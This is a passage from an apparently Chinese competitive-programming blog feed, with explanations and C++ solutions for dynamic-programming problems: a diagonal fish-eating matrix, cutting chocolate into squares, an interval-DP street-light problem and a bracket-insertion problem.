<li>猫猫是个贪婪的家伙，所以她想一口吃掉尽量多的鱼。请你帮猫猫计算一下，她一口下去，最多可以吃掉多少条鱼？</li>
</ul>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>第一行有两个整数n和m（n,m≥1），描述池塘规模。接下来的n行，每行有m个数字（非“0”即“1”）。每两个数字之间用空格隔开。</p>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>只有一个整数——猫猫一口下去可以吃掉的鱼的数量，占一行，行末有回车。</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题，首先你需要正确的理解题意，表示如果喵喵要吃鱼鱼的话，就要让对角线上的全部都是鱼鱼才能够被吃掉的说（理解错题意然后手推两个小时乱子都没有推出来的弱鸡）。然后对角线有两种，分别是左上到右下，和右上到左下，所以需要处理两次。</p>
<p>然后这道题我们要明白，在对角线所在的矩阵中，除了对角线意外的地方不能有鱼，QAQ奇怪的设定。我们所设置的状态 <code>f[i][j]</code> 表示的是在以横坐标为i，纵坐标为j的对角线末端所能够吃到的最大的鱼鱼的数量。</p>
<p>然后就开始找关系了，对于 <code>f[i][j]</code> 可以从 <code>f[i-1][j-1]</code> 来推过来，如果 <code>f[i][j]</code> 为没有鱼，我奉劝你continue，如果有鱼，就开始和 <code>f[i-1][j-1]</code> 进行对接，但是仔细想一想，如果在 <code>f[i][j]</code> 相同一行或者一列的，在 <code>f[i-1][j-1]</code> 所形成的最大鱼鱼数范围之内有地方有鱼，也就是说在矩阵中除了对角线的地方还有其他地方有鱼，那么就是不成立的，但是我们怎样找到最大的成立矩阵呢。</p>
<p>这个我们就需要进行预处理了（预处理大法好！），然后我们可以建立数组 <code>Up[i][j]</code> ， <code>Left[i][j]</code> ，和 <code>Right[i][j]</code> 这三个数组，分别表示在i，j这个位置上，<code>Left/Right/Up</code>（左边/右边/上边）连续0（没有鱼）的长度，这样我们在判断矩阵的大小的时候，选择的是这三个值的最小值—— <code>Left/Right/Up/f[i-1][j-1]</code>（当对角线为左上到右下的时候为 <code>Left/Up/f[i-1][j-1]</code> ，对角线为右上到坐下的时候为 <code>Right/Up/f[i-1][j-1]</code> ） <code>f[i-1][j-1]</code> 的值就是本身矩阵的长度，所以说最后在成立最大矩阵加上i,j这条鱼，就是 <code>f[i][j]</code> 的最终值！</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,a[<span class="number">3000</span>][<span class="number">3000</span>];</span><br><span class="line"><span class="keyword">int</span> f[<span class="number">3000</span>][<span class="number">3000</span>],ans=<span class="number">0</span>,Up[<span class="number">3000</span>][<span class="number">3000</span>];</span><br><span class="line"><span class="keyword">int</span> Right[<span class="number">3000</span>][<span class="number">3000</span>],Left[<span class="number">3000</span>][<span class="number">3000</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Up,<span class="number">0</span>,<span class="keyword">sizeof</span>(Up));</span><br><span class="line">    <span class="built_in">memset</span>(Left,<span class="number">0</span>,<span class="keyword">sizeof</span>(Left));</span><br><span class="line">    <span class="built_in">memset</span>(Right,<span class="number">0</span>,<span class="keyword">sizeof</span>(Right));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i][j];</span><br><span class="line">        <span class="keyword">if</span>(a[i][j]==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Up[i+<span class="number">1</span>][j]=Up[i][j]+<span class="number">1</span>;</span><br><span class="line">            Left[i][j+<span class="number">1</span>]=Left[i][j]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=m;j&gt;=<span class="number">1</span>;j--)</span><br><span class="line">    <span class="keyword">if</span>(a[i][j]==<span class="number">0</span>)</span><br><span class="line">    Right[i][j<span class="number">-1</span>]=Right[i][j]+<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    <span class="keyword">if</span>(a[i][j]==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f[i][j]=min(f[i<span class="number">-1</span>][j<span class="number">-1</span>],Left[i][j]);</span><br><span class="line">        f[i][j]=min(f[i][j],Up[i][j])+<span class="number">1</span>;</span><br><span class="line">        ans=max(ans,f[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">0</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=m;j&gt;=<span class="number">1</span>;j--)</span><br><span class="line">    <span class="keyword">if</span>(a[i][j]==<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        f[i][j]=min(f[i<span class="number">-1</span>][j+<span class="number">1</span>],Right[i][j]);</span><br><span class="line">        f[i][j]=min(f[i][j],Up[i][j])+<span class="number">1</span>;</span><br><span class="line">        ans=max(ans,f[i][j]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;ans&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1298矩阵切割"><a href="#P1298矩阵切割" class="headerlink" title="P1298矩阵切割"></a>P1298矩阵切割</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>森炊很喜欢巧克力，也很喜欢正方形，但是并不是所有他想吃的巧克力都是正方形的，对于一个长方形的巧克力来说，森炊会把他掰成若干个正方形巧克力来吃，现在他买了一块巧克力，他想知道在把巧克力吃完的前提下，至少能吃到多少块正方形巧克力。由于森炊是一个耿直的人，他掰巧克力的方向只会与巧克力的边平行，不会发生斜着掰巧克力的情况</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>输入文件中包含两个正整数，代表矩形巧克力的边长，每边长均在1—100之间。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出文件包含一行，输出森炊最少能吃到多少块正方形巧克力。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题不少人看到题就开始想贪心，只要能让子正方形越大越好……</p>
<p>QAQ太天真了……而且这种贪心可能可以过几组小数据，坑人啊……</p>
<p><img src="http://172.20.6.3/problemImg/P1298.jpg"></p>
<p>这道题请看数据范围（100！！！），好的四重循环以内，想必你已经猜测出来了，我们建立数组 <code>f[i][j]</code> 表示长为i，宽为j的矩阵里面包含的最小正方形的个数，然后我们就可以想如何从小推到大了。</p>
<p>首先我们一个大问题是由子问题推出来的，子问题是什么呢，想必看到四重循环就明白差不多了吧，我们再次开一个两重循环，枚举 <code>1—i</code> 和 <code>1—j</code> ，表示一个分割点，把矩阵 <code>i-j</code> 通过最新枚举的中间点分割为4个子矩阵，然后用子矩阵加起来更新 <code>f[i][j]</code> 最后输出 <code>f[n][m]</code> 答案就好。</p>
<p>充分说明了看数据范围的重要性！</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,m,f[<span class="number">101</span>][<span class="number">101</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">10</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;m;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;=max(n,m);i++)</span><br><span class="line">	&#123;</span><br><span class="line">		f[<span class="number">0</span>][i]=<span class="number">0</span>;</span><br><span class="line">		f[i][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">		f[i][i]=<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">1</span>;j&lt;=m;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">1</span>;k&lt;=i;k++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> p=<span class="number">1</span>;p&lt;=j;p++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">int</span> xx=f[k][p]+f[i-k][p]+f[k][j-p]+f[i-k][j-p];</span><br><span class="line">            f[i][j]=min(xx,f[i][j]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="built_in">cout</span>&lt;&lt;f[n][m]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>算法竞赛</category>
      </categories>
      <tags>
        <tag>题解</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>区间动态规划</title>
    <url>/2017/05/20/98e5c822f612/</url>
    <content><![CDATA[<h1 id="区间动态规划"><a href="#区间动态规划" class="headerlink" title="区间动态规划"></a>区间动态规划</h1><blockquote>
<p>今天谜一样的把区间动态规划给敲完了QAQ，好累……特地来总结一下！</p>
</blockquote>
<p>区间动态规划就是针对一个区间，进行从小区间推到大区间，而大区间的值来自于小区间，一般是有三重循环，最外面枚举区间长度，从2开始，另一个循环开始枚举出发点，然后结尾就可以计算出来，最后枚举在i到j中选择分割点来分割成两个小区间来更新i到j这个大区间。区间DP在乎的是区间成体的最优值。</p>
<p>然后区间DP的题并不水，要比昨天的题目要难一些的，所以还需要多多复习一下！PS：（省选之前复习一下所有学过的模板，感觉已经忘光了QAQ）。</p>
<h1 id="P1290关灯"><a href="#P1290关灯" class="headerlink" title="P1290关灯"></a>P1290关灯</h1><h2 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>宁智贤得到了一份有趣而高薪的工作。每天早晨她必须关掉她所在村庄的街灯。所有的街灯都被设置在一条直路的同一侧。 宁智贤每晚到早晨5点钟都在晚会上，然后她开始关灯。开始时，她站在某一盏路灯的旁边。 每盏灯都有一个给定功率的电灯泡，因为宁智贤有着自觉的节能意识，她希望在耗能总数最少的情况下将所有的灯关掉。 宁智贤因为太累了，所以只能以1m/s的速度行走。关灯不需要花费额外的时间，因为当她通过时就能将灯关掉。 编写程序，计算在给定路灯设置，灯泡功率以及宁智贤的起始位置的情况下关掉所有的灯需耗费的最小能量。</p>
</blockquote>
<h2 id="输入："><a href="#输入：" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<ol>
<li>第一行包含一个整数N，2≤N≤1000，表示该村庄路灯的数量。</li>
<li>第二行包含一个整数V，1≤V≤N，表示宁智贤开始关灯的路灯号码。</li>
<li>接下来的N行中，每行包含两个用空格隔开的整数D和W，用来描述每盏灯的参数，其中0≤D≤1000，0≤W≤1000。D表示该路灯与村庄开始处的距离(用米为单位来表示)，W表示灯泡的功率，即在每秒种该灯泡所消耗的能量数。路灯是按顺序给定的。</li>
</ol>
</blockquote>
<h2 id="输出："><a href="#输出：" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>第一行即唯一的一行应包含一个整数，即消耗能量之和的最小值。注意结果小超过1,000,000,000</p>
</blockquote>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p>这道题是一道比较好的区间动态规划的题目，我那道题之后，就开始各种无脑猜测，结果，结果什么都没有猜出来，全被自己否决了。最后被逼无奈的看了题解（以后要注重自己的思维性的培养，少看题解！）。题解大概是这样解题的。</p>
<p>注：下面所有的i，j表示的是灯的序数并非横坐标。</p>
<p>我们首先列出来状态设置，首先因为是区间动态规划，所以说我们可以建立一个数组 <code>f[i][j]</code> 表示关掉区域i到j的所有灯所需要消耗的最少电，但是推来推去，就是无法得出正确的状态转移方程，所以说我们还需要进行各种无脑猜测，因为在实际的状态中我们在进行从小推到大的时候，关掉子区域i到k和关掉子区域k到j的过程中，两个子区域关闭之后，人在左端还是右端是会影响最后的答案的，有可能位于左端的时候会比在右端的时候多走一些等待路程（其过程消耗功率是相同的，所以就多了消耗些电）。</p>
<p>那么我们就需要增加一个维度了，开一个数组 <code>f[i][j][k]</code> 表示在关掉区域i到j所有灯的时候，最后停留在k端所消耗的最小电能（当k==1的时候为右段，k==0的时候为左端）。然后我们分别计算在位于左端和右端的时候的最优值。<br>我们就开始分析状态的转移，我们知道 <code>f[i][j]</code> 的关系只和 <code>f[i+1][j]</code> 和 <code>f[i][j-1]</code> 有关 (<code>f[i][j]</code> 的一个子区域) ，那么我们就可以通过 <code>f[i][j]</code> 和 <code>f[i+1][j]</code> 和 <code>f[i][j-1]</code> 里面选择并推导出来 <code>f[i][j]</code> ，因为还有左端和右端的关系，所以一共从四种情况中选择出来两种进行更新。</p>
<h2 id="代码："><a href="#代码：" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Light</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> Way;</span><br><span class="line">    <span class="keyword">int</span> Electricity;</span><br><span class="line">&#125;a[<span class="number">1001</span>];</span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">mycmp</span><span class="params">(Light a,Light b)</span></span></span><br><span class="line"><span class="function"></span>&#123; <span class="keyword">return</span> a.Way&lt;b.Way; &#125;</span><br><span class="line"><span class="keyword">int</span> n,Start,f[<span class="number">1001</span>][<span class="number">1001</span>][<span class="number">2</span>];</span><br><span class="line"><span class="keyword">int</span> Get[<span class="number">1001</span>][<span class="number">1001</span>],xx,yy;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">10</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Get,<span class="number">0</span>,<span class="keyword">sizeof</span>(Get));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n&gt;&gt;Start;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a[i].Way&gt;&gt;a[i].Electricity;</span><br><span class="line">    sort(a+<span class="number">1</span>,a+<span class="number">1</span>+n,mycmp);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)</span><br><span class="line">    a[i].Electricity+=a[i<span class="number">-1</span>].Electricity;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> j=i;j&lt;=n;j++)</span><br><span class="line">    Get[i][j]=a[n].Electricity+a[i<span class="number">-1</span>].Electricity-a[j].Electricity;</span><br><span class="line">    f[Start][Start][<span class="number">1</span>]=<span class="number">0</span>;</span><br><span class="line">    f[Start][Start][<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> p=<span class="number">2</span>;p&lt;=n;p++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j=i+p<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(j&gt;n) <span class="keyword">break</span>;</span><br><span class="line">        xx=f[i+<span class="number">1</span>][j][<span class="number">0</span>]+(a[i+<span class="number">1</span>].Way-a[i].Way)*Get[i+<span class="number">1</span>][j];</span><br><span class="line">        yy=f[i+<span class="number">1</span>][j][<span class="number">1</span>]+(a[j].Way-a[i].Way)*Get[i+<span class="number">1</span>][j];</span><br><span class="line">        f[i][j][<span class="number">0</span>]=min(xx,yy);</span><br><span class="line">        xx=f[i][j<span class="number">-1</span>][<span class="number">0</span>]+(a[j].Way-a[i].Way)*Get[i][j<span class="number">-1</span>];</span><br><span class="line">        yy=f[i][j<span class="number">-1</span>][<span class="number">1</span>]+(a[j].Way-a[j<span class="number">-1</span>].Way)*Get[i][j<span class="number">-1</span>];</span><br><span class="line">        f[i][j][<span class="number">1</span>]=min(xx,yy);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;min(f[<span class="number">1</span>][n][<span class="number">0</span>],f[<span class="number">1</span>][n][<span class="number">1</span>])&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="P1291添加括号"><a href="#P1291添加括号" class="headerlink" title="P1291添加括号"></a>P1291添加括号</h1><h2 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h2><blockquote>
<p>给定一个<strong>正整数</strong>序列a(1)，a(2)，…，a(n),(1&lt;=n&lt;=20) 不改变序列中每个元素在序列中的位置，把它们相加，并用括号记每次加法所得的和，称为中间和。 例如: 给出序列是4，1，2，3。 第一种添括号方法: ((4+1)+(2+3))=((5)+(5))=(10) 有三个中间和是5，5，10，它们之和为:5+5+10=20 第二种添括号方法 (4+((1+2)+3))=(4+((3)+3))=(4+(6))=(10) 中间和是3，6，10，它们之和为19。</p>
</blockquote>
<h2 id="输入：-1"><a href="#输入：-1" class="headerlink" title="输入："></a>输入：</h2><blockquote>
<p>共两行。 第一行，为整数n。(1&lt;=n&lt;=20) 第二行，为a(1),a(2),…,a(n)这n个正整数，每个数字不超过100。</p>
</blockquote>
<h2 id="输出：-1"><a href="#输出：-1" class="headerlink" title="输出："></a>输出：</h2><blockquote>
<p>输出3行。 第一行，为添加括号的方法。 第二行，为最终的中间和之和。 第三行，为n-1个中间和，按照从里到外，从左到右的顺序输出。</p>
</blockquote>
<h2 id="题解：-1"><a href="#题解：-1" class="headerlink" title="题解："></a>题解：</h2><p>这道题的第一问其实并不难，仅仅只是一个很典型的区间DP而已，我们直接建立一个f[i][j]数组表示i和j之间的数用大括号括起来的所有权值大小，然后进行一个分区枚举k，表示f[i][k]加上f[k+1][j]的权值不断更新f[i][j]，这样做之所以会成立是因为扩号要求扩出来的里面必须要有两个元素（扩号里面的算一个单独元素），所以说我们这样直接枚举连个元素进行括起来，然后更新值就能得出最优答案。</p>
<p>但难的地方就是在于最后答案的输出，因为这些并不是按照顺序的，所以最后我们需要按照题目要求的顺序输出，那么我们新建一个数组cut[i][j]存储着一个k值，表示的是在更新i到j的最优值的时候，是依靠f[i][k]和f[k+1][j]来更新f[i][j]的，然后用DFS进行输出，</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">First_out</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;=j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a[i];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;(&quot;</span>;</span><br><span class="line">    First_out(i,cut[i][j]);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;+&quot;</span>;</span><br><span class="line">    First_out(cut[i][j]+<span class="number">1</span>,j);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里用cut存储的值，不断将区间折断，并输出“ ( ”，一直到最初的两个区间之后，开始输出区间里左半部分的值，然后开始输出相同优先级别的大括号，然后再次进行递归，不停地补充右半部分，最后完成；</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Second_out</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;=j) <span class="keyword">return</span>;</span><br><span class="line">    Second_out(i,cut[i][j]);</span><br><span class="line">    Second_out(cut[i][j]+<span class="number">1</span>,j);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Get[j]-Get[i<span class="number">-1</span>]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的本质和上面是一样的，同样是进行先输出左半部分，然后输出右半部分（因为从里到外，从左到右）。</p>
<p>好了，这道题我们就愉快的AC了QAQ</p>
<h2 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a>代码：</h2><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">int</span> n,a[<span class="number">100</span>],f[<span class="number">100</span>][<span class="number">100</span>];</span><br><span class="line"><span class="keyword">int</span> cut[<span class="number">100</span>][<span class="number">100</span>],mini,Get[<span class="number">100</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">First_out</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;=j)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a[i];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;(&quot;</span>;</span><br><span class="line">    First_out(i,cut[i][j]);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;+&quot;</span>;</span><br><span class="line">    First_out(cut[i][j]+<span class="number">1</span>,j);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;)&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Second_out</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> j)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(i&gt;=j) <span class="keyword">return</span>;</span><br><span class="line">    Second_out(i,cut[i][j]);</span><br><span class="line">    Second_out(cut[i][j]+<span class="number">1</span>,j);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;Get[j]-Get[i<span class="number">-1</span>]&lt;&lt;<span class="string">&#x27; &#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(f,<span class="number">10</span>,<span class="keyword">sizeof</span>(f));</span><br><span class="line">    <span class="built_in">memset</span>(Get,<span class="number">0</span>,<span class="keyword">sizeof</span>(Get));</span><br><span class="line">    <span class="built_in">memset</span>(cut,<span class="number">0</span>,<span class="keyword">sizeof</span>(cut));</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">cin</span>&gt;&gt;a[i];</span><br><span class="line">        Get[i]=a[i]+Get[i<span class="number">-1</span>];</span><br><span class="line">        f[i][i]=<span class="number">0</span>;</span><br><span class="line">        cut[i][i]=i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> k=<span class="number">2</span>;k&lt;=n;k++)</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> j=i+k<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">if</span>(j&gt;n) <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> k=i;k&lt;j;k++)</span><br><span class="line">        <span class="keyword">if</span>(f[i][k]+f[k+<span class="number">1</span>][j]&lt;=f[i][j])</span><br><span class="line">        &#123;</span><br><span class="line">            f[i][j]=f[i][k]+f[k+<span class="number">1</span>][j];</span><br><span class="line">            mini=k;</span><br><span class="line">        &#125;</span><br><span class="line">        cut[i][j]=mini;</span><br><span class="line">        f[i][j]=f[i][j]+Get[j]-Get[i<span class="number">-1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    First_out(<span class="number">1</span>,n);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>&lt;&lt;f[<span class="number">1</span>][n]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    Second_out(<span class="number">1</span>,n);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span 